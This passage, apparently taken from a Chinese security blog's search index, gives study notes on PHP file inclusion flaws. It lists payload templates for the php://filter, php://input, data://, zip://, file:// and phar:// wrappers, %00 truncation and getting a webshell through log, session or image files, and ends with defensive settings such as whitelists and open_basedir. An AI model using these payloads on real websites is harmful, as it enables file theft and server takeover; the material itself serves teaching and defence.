title="本地文件包含利用"></a>本地文件包含利用</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">上传图片马，包含图片马GetShell<br>读取网站源码以及配置文件<br>包含日志文件GetShell<br>包含session文件拿<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-number">1</span>.当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。<br><span class="hljs-number">2</span>.本地文件包含和远程文件包含造成漏洞的原因是一样的，当php.ini中的配置选项allow_url_fopen和allow_url_include为<span class="hljs-keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。(fopen默认是打开的,本地的;<span class="hljs-keyword">include</span>是远程)<br></code></pre></td></tr></table></figure><p>截断符号</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml">?<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span><br></code></pre></td></tr></table></figure><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一种：<br>file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);            <span class="hljs-regexp">//</span>任意文件读取<br><br>第二种:<br><span class="hljs-variable">$a</span> = fopen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br>echo fread(<span class="hljs-variable">$a</span>,<span class="hljs-number">200</span>)                          <span class="hljs-regexp">//</span><span class="hljs-number">200</span>是读取长度   <br></code></pre></td></tr></table></figure><h3 id="文件包含相关协议"><a href="#文件包含相关协议" class="headerlink" title="文件包含相关协议"></a>文件包含相关协议</h3><h5 id="php-x2F-x2F-fileter-读取"><a href="#php-x2F-x2F-fileter-读取" class="headerlink" title="php:&#x2F;&#x2F;fileter       读取"></a>php:&#x2F;&#x2F;fileter       读取</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>      ,     allow_url_include=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span><br>php://<span class="hljs-keyword">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=文件路径名<br></code></pre></td></tr></table></figure><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span>   ,    allow_url_include=<span class="hljs-keyword">On</span><br>需要<span class="hljs-keyword">GET</span>提交,在BP转换成[POST提交]<br></code></pre></td></tr></table></figure><h5 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen=On      ,     allow_url_include=On<br>用法<span class="hljs-number">1</span>: ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span>执行内容<span class="hljs-meta">?&gt;</span><br>用法<span class="hljs-number">2</span>: ?file=data:text/plain;base64,编码后的php代码<br>注意base64加密之后的代码,不能够有+号,否则会和url中的+编码冲突<br></code></pre></td></tr></table></figure><h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用zip协议，需要将<span class="hljs-comment">#编码改为%23，所以需要PHP的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23</span><br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.zip%<span class="hljs-number">231</span>.txt<br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg%<span class="hljs-number">231</span>.txt<br></code></pre></td></tr></table></figure><h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">//可以用来访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。</span><br>用法：?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件绝对路径</span><br></code></pre></td></tr></table></figure><h5 id="Phar-x2F-x2F-反序列化漏洞"><a href="#Phar-x2F-x2F-反序列化漏洞" class="headerlink" title="Phar:&#x2F;&#x2F;(反序列化漏洞)"></a>Phar:&#x2F;&#x2F;(反序列化漏洞)</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">用法:?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//压缩包/内部文件示例:</span><br>phar:<span class="hljs-comment">//xxx.png/shell.php</span><br>注意:PHP &gt;= 5.3.0压缩包需要是<span class="hljs-keyword">zip</span>协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br>步骤:写一个一句话木马文件<span class="hljs-keyword">shell</span>.php，然后用<span class="hljs-keyword">zip</span>协议压缩为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">zip</span>,然后将后缀改为png等其他格式。<br></code></pre></td></tr></table></figure><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">需要magic_quotes_gpc=<span class="hljs-keyword">off</span>,<br>PHP小于<span class="hljs-number">5.3</span>.<span class="hljs-number">4</span>有效<br>用法: <span class="hljs-keyword">test</span>.jpg%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h5 id="伪协议包含的类型总结"><a href="#伪协议包含的类型总结" class="headerlink" title="伪协议包含的类型总结"></a>伪协议包含的类型总结</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span>访问本地文件系统<br>http:<span class="hljs-regexp">//</span>访问 HTTPs 网址<br>Php:<span class="hljs-regexp">//</span>访问输入输出流<br>Zib:<span class="hljs-regexp">//</span>压缩流<br>Data:<span class="hljs-regexp">//</span>数据<br>Phar:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><h4 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 设置白名单<br>   代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。<br><span class="hljs-number">2.</span> 过滤危险字符<br>   由于<span class="hljs-keyword">Include</span>/Require可以对PHP <span class="hljs-keyword">Wrapper</span>形式的地址进行包含执行（需要配置php.ini)，在Linux环境中可以通过&quot;../../&quot;&quot;的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。<br>3. 设置文件目录<br>   PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。<br>4. 关闭危险配置(禁止远程文件包含)<br>   PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test123</title>
    <link href="/2022/10/01/test123/"/>
    <url>/2022/10/01/test123/</url>
    
    <content type="html"><![CDATA[<p>112233</p><p><img src="/../images/test123/image-20221026105758264.png" alt="0"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
